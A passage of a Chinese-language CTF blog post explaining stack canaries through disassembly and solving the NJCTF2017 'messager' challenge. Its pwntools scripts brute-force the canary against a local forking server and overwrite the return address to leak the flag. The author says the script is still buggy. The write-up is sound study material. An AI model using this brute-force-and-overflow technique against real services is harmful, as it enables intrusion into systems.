class=\"line\">pwndbg&gt; disass main</span><br><span class=\"line\">Dump of assembler code for function main:</span><br><span class=\"line\">   0x00005555555546da &lt;+0&gt;:\tpush   rbp</span><br><span class=\"line\">   0x00005555555546db &lt;+1&gt;:\tmov    rbp,rsp</span><br><span class=\"line\">   0x00005555555546de &lt;+4&gt;:\tsub    rsp,0x20</span><br><span class=\"line\">   </span><br><span class=\"line\">   </span><br><span class=\"line\">   0x00005555555546e2 &lt;+8&gt;:\tmov    rax,QWORD PTR fs:0x28</span><br><span class=\"line\">   0x00005555555546eb &lt;+17&gt;:\tmov    QWORD PTR [rbp-0x8],rax</span><br><span class=\"line\">   </span><br><span class=\"line\">   </span><br><span class=\"line\">   0x00005555555546ef &lt;+21&gt;:\txor    eax,eax</span><br><span class=\"line\">   0x00005555555546f1 &lt;+23&gt;:\tlea    rax,[rbp-0x12]</span><br><span class=\"line\">   0x00005555555546f5 &lt;+27&gt;:\tmov    rsi,rax</span><br><span class=\"line\">   0x00005555555546f8 &lt;+30&gt;:\tlea    rdi,[rip+0xa5]        # 0x5555555547a4</span><br><span class=\"line\">   0x00005555555546ff &lt;+37&gt;:\tmov    eax,0x0</span><br><span class=\"line\">   0x0000555555554704 &lt;+42&gt;:\tcall   0x5555555545b0 &lt;__isoc99_scanf@plt&gt;</span><br><span class=\"line\">   0x0000555555554709 &lt;+47&gt;:\tnop</span><br><span class=\"line\">   </span><br><span class=\"line\">   0x000055555555470a &lt;+48&gt;:\tmov    rax,QWORD PTR [rbp-0x8]</span><br><span class=\"line\">=&gt; 0x000055555555470e &lt;+52&gt;:\txor    rax,QWORD PTR fs:0x28</span><br><span class=\"line\">   0x0000555555554717 &lt;+61&gt;:\tje     0x55555555471e &lt;main+68&gt;</span><br><span class=\"line\">   0x0000555555554719 &lt;+63&gt;:\tcall   0x5555555545a0 &lt;__stack_chk_fail@plt&gt;</span><br><span class=\"line\">   </span><br><span class=\"line\">   0x000055555555471e &lt;+68&gt;:\tleave</span><br><span class=\"line\">   0x000055555555471f &lt;+69&gt;:\tret</span><br><span class=\"line\">End of assembler dump.</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t\t注意看8 17 和 48 52 61 63这几行, 第一部分是开头. 从fs寄存器的偏移0x28位置取出(具体请查阅其他资料)后,放入rax,然后放入rbp-0x8的位置存储canary</p>\n<p>​\t\t函数返回前,从栈上取出来,然后做xor对比,如果一样的话,就都是0,跳转到main + 68,正常结束,如果不一样的话,就调用__stack_chk_fail函数,报错了.</p>\n<h2 id=\"32位\"><a href=\"#32位\" class=\"headerlink\" title=\"32位\"></a>32位</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; disass main</span><br><span class=\"line\">Dump of assembler code for function main:</span><br><span class=\"line\">   0x5655559d &lt;+0&gt;:\tlea    ecx,[esp+0x4]</span><br><span class=\"line\">   0x565555a1 &lt;+4&gt;:\tand    esp,0xfffffff0</span><br><span class=\"line\">   0x565555a4 &lt;+7&gt;:\tpush   DWORD PTR [ecx-0x4]</span><br><span class=\"line\">   0x565555a7 &lt;+10&gt;:\tpush   ebp</span><br><span class=\"line\">   0x565555a8 &lt;+11&gt;:\tmov    ebp,esp</span><br><span class=\"line\">   0x565555aa &lt;+13&gt;:\tpush   ebx</span><br><span class=\"line\">   0x565555ab &lt;+14&gt;:\tpush   ecx</span><br><span class=\"line\">   0x565555ac &lt;+15&gt;:\tsub    esp,0x10</span><br><span class=\"line\">   0x565555af &lt;+18&gt;:\tcall   0x565555f9 &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class=\"line\">   0x565555b4 &lt;+23&gt;:\tadd    eax,0x1a20</span><br><span class=\"line\">   </span><br><span class=\"line\">   0x565555b9 &lt;+28&gt;:\tmov    ecx,DWORD PTR gs:0x14</span><br><span class=\"line\">   0x565555c0 &lt;+35&gt;:\tmov    DWORD PTR [ebp-0xc],ecx</span><br><span class=\"line\">   </span><br><span class=\"line\">   0x565555c3 &lt;+38&gt;:\txor    ecx,ecx</span><br><span class=\"line\">   0x565555c5 &lt;+40&gt;:\tsub    esp,0x8</span><br><span class=\"line\">   0x565555c8 &lt;+43&gt;:\tlea    edx,[ebp-0x16]</span><br><span class=\"line\">   0x565555cb &lt;+46&gt;:\tpush   edx</span><br><span class=\"line\">   0x565555cc &lt;+47&gt;:\tlea    edx,[eax-0x1934]</span><br><span class=\"line\">   0x565555d2 &lt;+53&gt;:\tpush   edx</span><br><span class=\"line\">   0x565555d3 &lt;+54&gt;:\tmov    ebx,eax</span><br><span class=\"line\">   0x565555d5 &lt;+56&gt;:\tcall   0x56555440 &lt;__isoc99_scanf@plt&gt;</span><br><span class=\"line\">=&gt; 0x565555da &lt;+61&gt;:\tadd    esp,0x10</span><br><span class=\"line\">   0x565555dd &lt;+64&gt;:\tnop</span><br><span class=\"line\">   </span><br><span class=\"line\">   0x565555de &lt;+65&gt;:\tmov    eax,DWORD PTR [ebp-0xc]</span><br><span class=\"line\">   0x565555e1 &lt;+68&gt;:\txor    eax,DWORD PTR gs:0x14</span><br><span class=\"line\">   0x565555e8 &lt;+75&gt;:\tje     0x565555ef &lt;main+82&gt;</span><br><span class=\"line\">   0x565555ea &lt;+77&gt;:\tcall   0x56555670 &lt;__stack_chk_fail_local&gt;</span><br><span class=\"line\">   </span><br><span class=\"line\">   </span><br><span class=\"line\">   0x565555ef &lt;+82&gt;:\tlea    esp,[ebp-0x8]</span><br><span class=\"line\">   0x565555f2 &lt;+85&gt;:\tpop    ecx</span><br><span class=\"line\">   0x565555f3 &lt;+86&gt;:\tpop    ebx</span><br><span class=\"line\">   0x565555f4 &lt;+87&gt;:\tpop    ebp</span><br><span class=\"line\">   0x565555f5 &lt;+88&gt;:\tlea    esp,[ecx-0x4]</span><br><span class=\"line\">   0x565555f8 &lt;+91&gt;:\tret</span><br><span class=\"line\">End of assembler dump.</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t关注28,35和65 - 77这几行,和64位的基本一样,就是canary的来源不同</p>\n<h1 id=\"题目练习\"><a href=\"#题目练习\" class=\"headerlink\" title=\"题目练习\"></a>题目练习</h1><h2 id=\"NJCTF2017-messager\"><a href=\"#NJCTF2017-messager\" class=\"headerlink\" title=\"NJCTF2017:messager\"></a>NJCTF2017:messager</h2><p>​\t\t64位程序</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-8-os%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6canary/image-20230226093403660.png\" alt=\"image-20230226093403660\"></p>\n<p>开了canary,要想办法绕过,然后开了nx,栈不可执行,要用rop之类的</p>\n<p>反汇编函数挺长的</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">main</span><span class=\"params\">(__int64 a1, <span class=\"type\">char</span> **a2, <span class=\"type\">char</span> **a3)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> optval; <span class=\"comment\">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">__pid_t</span> v5; <span class=\"comment\">// [rsp+4h] [rbp-Ch]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v6; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v6 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  sub_400B76(a1, a2, a3);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;[+]start..&quot;</span>);</span><br><span class=\"line\">  addr.sa_family = <span class=\"number\">2</span>;</span><br><span class=\"line\">  *(_WORD *)addr.sa_data = htons(<span class=\"number\">0x15B3</span>u);</span><br><span class=\"line\">  *(_DWORD *)&amp;addr.sa_data[<span class=\"number\">2</span>] = htonl(<span class=\"number\">0</span>);</span><br><span class=\"line\">  len = <span class=\"number\">16</span>;</span><br><span class=\"line\">  addr_len = <span class=\"number\">16</span>;</span><br><span class=\"line\">  v5 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;[+]socket..&quot;</span>);</span><br><span class=\"line\">  dword_602140 = socket(<span class=\"number\">2</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( dword_602140 &lt; <span class=\"number\">0</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    perror(<span class=\"string\">&quot;socket&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0xFFFFFFFF</span>LL;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  optval = <span class=\"number\">1</span>;</span><br><span class=\"line\">  setsockopt(dword_602140, <span class=\"number\">1</span>, <span class=\"number\">2</span>, &amp;optval, <span class=\"number\">4u</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;[+]bind..&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( bind(dword_602140, &amp;addr, len) &lt; <span class=\"number\">0</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    perror(<span class=\"string\">&quot;bind error&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0xFFFFFFFF</span>LL;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;[+]listen..&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( listen(dword_602140, <span class=\"number\">1024</span>) &lt; <span class=\"number\">0</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    perror(<span class=\"string\">&quot;listen&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0xFFFFFFFF</span>LL;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    fd = accept(dword_602140, &amp;stru_602130, &amp;addr_len);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( fd == <span class=\"number\">-1</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      perror(<span class=\"string\">&quot;accept&quot;</span>);</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">0xFFFFFFFF</span>LL;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    send(fd, <span class=\"string\">&quot;Welcome!\\n&quot;</span>, <span class=\"number\">9uLL</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">    v5 = fork();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v5 == <span class=\"number\">-1</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      perror(<span class=\"string\">&quot;fork&quot;</span>);</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">0xFFFFFFFF</span>LL;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !v5 )</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    close(fd);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  signal(<span class=\"number\">14</span>, handler);</span><br><span class=\"line\">  alarm(<span class=\"number\">3u</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)sub_400BE9() )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( send(fd, <span class=\"string\">&quot;Message receive failed\\n&quot;</span>, <span class=\"number\">0x19</span>uLL, <span class=\"number\">0</span>) == <span class=\"number\">-1</span> )</span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_14;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( send(fd, <span class=\"string\">&quot;Message received!\\n&quot;</span>, <span class=\"number\">0x12</span>uLL, <span class=\"number\">0</span>) == <span class=\"number\">-1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">LABEL_14:</span><br><span class=\"line\">    perror(<span class=\"string\">&quot;send&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0xFFFFFFFF</span>LL;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">sub_400BE9</span><br><span class=\"line\">  __int64 <span class=\"title function_\">sub_400BE9</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> s[<span class=\"number\">104</span>]; <span class=\"comment\">// [rsp+10h] [rbp-70h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v2; <span class=\"comment\">// [rsp+78h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v2 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;csfd = %d\\n&quot;</span>, (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)fd);</span><br><span class=\"line\">  bzero(s, <span class=\"number\">0x64</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)recv(fd, s, <span class=\"number\">0x400</span>uLL, <span class=\"number\">0</span>) == <span class=\"number\">-1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    perror(<span class=\"string\">&quot;recv&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0xFFFFFFFF</span>LL;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Message come: %s&quot;</span>, s);</span><br><span class=\"line\">    fflush(<span class=\"built_in\">stdout</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>sub_400BE9 这里接收的值的大小是0x400,超了s的104,存在栈溢出</p>\n<p>所以可以让每次fork的子进程来尝试</p>\n<p>问题是fork了之后是怎么个执行流? 父进程还在while循环,子进程呢?</p>\n<p>fork调用的一个奇妙之处就是它仅仅被调用一次，却能够返回两次，它可能有三种不同的返回值：</p>\n<p>(1)在父进程中，fork返回新创建子进程的进程ID；</p>\n<p>(2)在子进程中，fork返回0；</p>\n<p>(3)如果出现错误，fork返回一个<a href=\"https://baike.baidu.com/item/%E8%B4%9F%E5%80%BC?fromModule=lemma_inlink\">负值</a>。</p>\n<p>所以父进程会一直在while里循环,不会实际上接收到值,子进程才会接收到值,所以子进程崩了不影响父进程,就可以进行爆破canary</p>\n<p>Could not allocate dynamic translator buffer</p>\n<p>重新安装一下checksec</p>\n<p>查看端口根据进程号 </p>\n<p>netstat -anlp | grep “mess”</p>\n<p>看不懂要怎么连接…先百度一波。应该要有端口的呀</p>\n<p>socket(domain, type, protocol);</p>\n<p>accept(fd, addr, addr_len);</p>\n<p>listen(fd, n);</p>\n<p>汇编代码里写哪了呢?</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-8-os%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6canary/image-20221010212350634.png\" alt=\"image-20221010212350634\"></p>\n<p>​\t\t获取canary脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">canary = <span class=\"string\">b&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"number\">8</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"number\">256</span>):</span><br><span class=\"line\">        s = socket.socket()</span><br><span class=\"line\">        s.connect((<span class=\"string\">&quot;127.0.0.1&quot;</span>,<span class=\"number\">5555</span>))</span><br><span class=\"line\">        ret = s.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">        j = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">104</span> + <span class=\"built_in\">chr</span>(j).encode(<span class=\"string\">&quot;utf-8&quot;</span>)</span><br><span class=\"line\">        s.send(j)</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            ret = s.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span>  <span class=\"string\">b&quot;Message received!&quot;</span> <span class=\"keyword\">in</span> ret:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">&quot;success&quot;</span>)</span><br><span class=\"line\">                canary += <span class=\"built_in\">chr</span>(j)</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(canary)</span><br><span class=\"line\">                s.close()</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span>:</span><br><span class=\"line\">            <span class=\"keyword\">continue</span>      </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t但是这个脚本的问题,<font color=\"red\">好像在爆破canary的时候还是会有问题….先不管了…这个问题耽搁太久了,后面再研究</font></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">canary = <span class=\"string\">b&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"number\">8</span>):</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;tiao nale&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(canary)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"number\">256</span>):</span><br><span class=\"line\">        s = socket.socket()</span><br><span class=\"line\">        s.connect((<span class=\"string\">&quot;127.0.0.1&quot;</span>,<span class=\"number\">5555</span>))</span><br><span class=\"line\">        ret = s.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">        data = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">104</span> +canary +  <span class=\"built_in\">chr</span>(j).encode(<span class=\"string\">&quot;utf-8&quot;</span>)</span><br><span class=\"line\">        <span class=\"comment\">#print(data)</span></span><br><span class=\"line\">        s.send(data)</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            ret = s.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span>  <span class=\"string\">b&quot;Message received!&quot;</span> <span class=\"keyword\">in</span> ret:</span><br><span class=\"line\">                <span class=\"comment\">#print(&quot;success&quot;)</span></span><br><span class=\"line\">                canary += <span class=\"built_in\">bytes</span>(<span class=\"built_in\">chr</span>(j).encode(<span class=\"string\">&quot;utf-8&quot;</span>))</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(e)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">s = socket.socket()</span><br><span class=\"line\">s.connect((<span class=\"string\">&quot;127.0.0.1&quot;</span>,<span class=\"number\">5555</span>))</span><br><span class=\"line\">ret = s.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">s.send(<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">104</span>+canary+<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span> + p64(<span class=\"number\">0x400bc6</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(s.recv(<span class=\"number\">1024</span>))</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t假设已经得到了canary了,下一步是覆盖返回地址,有onegadget还是system binsh?后门函数?</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">ssize_t</span> <span class=\"title function_\">sub_400B76</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> fd; <span class=\"comment\">// [rsp+Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  fd = open(<span class=\"string\">&quot;./flag&quot;</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( fd &lt; <span class=\"number\">0</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    perror(<span class=\"string\">&quot;open flag failed&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> read(fd, &amp;unk_602160, <span class=\"number\">0x64</span>uLL);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t会把flag读到bss段,0x602160, 然后再构造一个puts把它打印出来吧,这里不需要libc了吗</p>\n<p>​\t\t溢出长度 + ebp + sub_400B76 + puts地址 + 返回地址 + 参数</p>\n<p>​\t\tnonono ,其实是这里藏了一个函数,为啥ida没有显示出来呢????</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:<span class=\"number\">0000000000400B</span>C6                 push    rbp</span><br><span class=\"line\">.text:<span class=\"number\">0000000000400B</span>C7                 mov     rbp, rsp</span><br><span class=\"line\">.text:<span class=\"number\">0000000000400B</span>CA                 mov     eax, cs:fd</span><br><span class=\"line\">.text:<span class=\"number\">0000000000400B</span>D0                 mov     ecx, <span class=\"number\">0</span></span><br><span class=\"line\">.text:<span class=\"number\">0000000000400B</span>D5                 mov     edx, <span class=\"number\">64</span>h ; <span class=\"string\">&#x27;d&#x27;</span></span><br><span class=\"line\">.text:<span class=\"number\">0000000000400B</span>DA                 mov     esi, offset unk_602160</span><br><span class=\"line\">.text:<span class=\"number\">0000000000400B</span>DF                 mov     edi, eax</span><br><span class=\"line\">.text:<span class=\"number\">0000000000400B</span>E1                 call    _send</span><br><span class=\"line\">.text:<span class=\"number\">0000000000400B</span>E6                 nop</span><br><span class=\"line\">.text:<span class=\"number\">0000000000400B</span>E7                 pop     rbp</span><br><span class=\"line\">.text:<span class=\"number\">0000000000400B</span>E8                 